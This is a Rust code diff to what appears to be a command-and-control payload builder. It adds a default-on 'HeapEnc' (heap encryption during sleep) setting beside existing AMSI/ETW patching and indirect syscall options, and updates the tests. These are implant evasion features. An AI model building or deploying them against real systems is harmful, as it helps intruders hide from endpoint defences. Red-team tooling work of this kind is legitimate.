@@ -697,6 +697,7 @@ impl PayloadBuilderService {
                     init_secret: None,
                     trust_x_forwarded_for: false,
                     trusted_proxy_peers: Vec::new(),
+                    heap_enc: true,
                     allow_legacy_ctr: false,
                 },
                 binary_patch: None,
@@ -1492,6 +1493,11 @@ fn merged_request_config(
         defaults.amsi_etw_patching.clone()
     };
     insert_default_string(&mut config, "Amsi/Etw Patch", amsi_default);
+    // ARC-04: HeapEnc defaults to true; propagate the profile value so that
+    // an explicit `HeapEnc = false` reaches pack_config.
+    if !config.contains_key("HeapEnc") {
+        config.insert("HeapEnc".to_owned(), Value::Bool(defaults.heap_enc));
+    }
     if let Some(injection) = &defaults.injection {
         let entry =
             config.entry("Injection".to_owned()).or_insert_with(|| Value::Object(Map::new()));
@@ -1575,6 +1581,12 @@ fn pack_config(
         if optional_bool(config, "Indirect Syscall").unwrap_or(false) { 1 } else { 0 },
     );
     add_u32(&mut out, amsi_patch_value(optional_string(config, "Amsi/Etw Patch")));
+
+    // ARC-04: heap encryption during sleep — default ON.
+    add_u32(
+        &mut out,
+        if optional_bool(config, "HeapEnc").unwrap_or(true) { 1 } else { 0 },
+    );
 
     match listener {
         ListenerConfig::Http(http) => pack_http_listener(&mut out, http)?,
@@ -2865,6 +2877,7 @@ mod tests {
                 init_secret: None,
                 trust_x_forwarded_for: false,
                 trusted_proxy_peers: Vec::new(),
+                heap_enc: true,
                 allow_legacy_ctr: false,
             },
         )?;
@@ -2948,6 +2961,7 @@ mod tests {
         assert_eq!(read_u32(&mut cursor)?, 2);
         assert_eq!(read_u32(&mut cursor)?, 1);
         assert_eq!(read_u32(&mut cursor)?, 1);
+        assert_eq!(read_u32(&mut cursor)?, 1); // HeapEnc (default true)
         assert_eq!(read_u64(&mut cursor)?, 1234);
         assert_eq!(read_u32(&mut cursor)?, 5_243_968);
         assert_eq!(read_wstring(&mut cursor)?, "POST");
@@ -3005,6 +3019,7 @@ mod tests {
         assert_eq!(read_u32(&mut cursor)?, 0);
         assert_eq!(read_u32(&mut cursor)?, 0);
         assert_eq!(read_u32(&mut cursor)?, 0);
+        assert_eq!(read_u32(&mut cursor)?, 1); // HeapEnc (default true)
         assert_eq!(read_wstring(&mut cursor)?, r"\\.\pipe\pivot");
         assert_eq!(read_u64(&mut cursor)?, 0);
         assert_eq!(read_u32(&mut cursor)?, 0);
@@ -3063,6 +3078,7 @@ mod tests {
         assert_eq!(read_u32(&mut cursor)?, 0);
         assert_eq!(read_u32(&mut cursor)?, 0);
         assert_eq!(read_u32(&mut cursor)?, 0);
+        assert_eq!(read_u32(&mut cursor)?, 1); // HeapEnc (default true)
         assert_eq!(read_u64(&mut cursor)?, 0);
         assert_eq!(read_u32(&mut cursor)?, 0);
         assert_eq!(read_wstring(&mut cursor)?, "POST");
@@ -3621,6 +3637,7 @@ mod tests {
                 init_secret: None,
                 trust_x_forwarded_for: false,
                 trusted_proxy_peers: Vec::new(),
+                heap_enc: true,
                 allow_legacy_ctr: false,
             },
             service: None,
@@ -4000,6 +4017,7 @@ mod tests {
                 init_secret: None,
                 trust_x_forwarded_for: false,
                 trusted_proxy_peers: Vec::new(),
+                heap_enc: true,
                 allow_legacy_ctr: false,
             },
             None,
@@ -4141,6 +4159,7 @@ mod tests {
                 init_secret: None,
                 trust_x_forwarded_for: false,
                 trusted_proxy_peers: Vec::new(),
+                heap_enc: true,
                 allow_legacy_ctr: false,
             },
             None,
